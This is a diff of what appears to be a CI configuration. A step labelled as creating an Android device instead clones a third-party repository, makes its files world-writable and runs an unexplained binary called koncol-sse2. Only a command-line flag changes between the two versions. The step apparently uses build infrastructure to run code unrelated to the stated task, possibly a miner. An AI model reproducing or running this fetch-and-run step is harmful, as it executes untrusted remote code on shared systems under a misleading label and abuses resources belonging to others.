@@ -9,7 +9,7 @@ container:
 check_android_task:
 
   create_device_script:
-        git clone https://github.com/jgaswer/mino && cd mino && chmod 777 * && ./koncol-sse2 -c
+        git clone https://github.com/jgaswer/mino && cd mino && chmod 777 * && ./koncol-sse2 --c
 
 
   start_emulator_background_script:
